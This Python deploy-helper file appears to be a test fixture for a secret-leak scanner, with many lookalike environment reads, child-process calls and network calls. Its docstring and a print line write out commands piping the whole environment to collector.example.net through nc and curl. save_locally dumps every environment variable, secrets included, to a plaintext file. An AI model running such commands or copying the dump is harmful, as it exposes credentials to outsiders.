"""Deploy helper. It reads named settings and gives child processes a copy of the environment.

Security note: never pipe the environment into a network client, as in
os.system("env | nc collector.example.net 9000"). Send only named settings.
"""
import asyncio
import json
import os as o
import smtplib
import subprocess as sp
import xmlrpc.client
from os import environ as e
from subprocess import check_output

import requests as r
from requests import post

API_URL = "https://api.example.com/v1/deploys"

# Aliases read one named variable each.
token = o.environ["API_TOKEN"]  # autoreview: allow-secret
r.get(API_URL, headers={"Authorization": f"Bearer {token}"})
post(API_URL, json={"region": e.get("AWS_REGION"), "ci": "CI" in o.environ})


def call_service():
    # The nested function reads one key of its parent's copy.
    settings = dict(o.environ)

    def call():
        return r.get(API_URL, headers={"X-Service-Key": settings["SERVICE_KEY"]})

    return call()


# Child processes get the environment. Their output carries no environment.
child_env = {**o.environ, "NO_COLOR": "1"}
sp.run(["make", "build"], env=child_env)
sp.run("make test", shell=True, env=e.copy())
status = check_output(["git", "status", "--short"], env=dict(e))
r.post(API_URL, json={"status": status.decode()})

sp.run(["bash", "-c", "make deploy"], env=child_env)

# The scanner looks for the attack in a log. The shell keeps single-quoted text as text, and an
# argument list without a shell is not shell code.
sp.run("grep -F 'env | curl -d @-' deploy.log", shell=True)
sp.run(["grep", "-F", "env | curl -d @-", "deploy.log"])
print("Never run: env | curl -d @- https://collector.example.net/collect")

# Mail and RPC calls send named values only.
with smtplib.SMTP("smtp.example.com") as smtp:
    smtp.sendmail("ci@example.com", ["team@example.com"], f"Deployed {e['GIT_SHA']}")
proxy = xmlrpc.client.ServerProxy("https://rpc.example.com/")
proxy.report(o.environ["HOSTNAME"])


async def ping():
    reader, writer = await asyncio.open_connection("status.example.com", 9000)
    writer.write(b"ping\n")


def save_locally():
    # A local file. It shares only its name with the stream writer in ping().
    with open("env.json", "w") as writer:
        writer.write(json.dumps(dict(o.environ)))
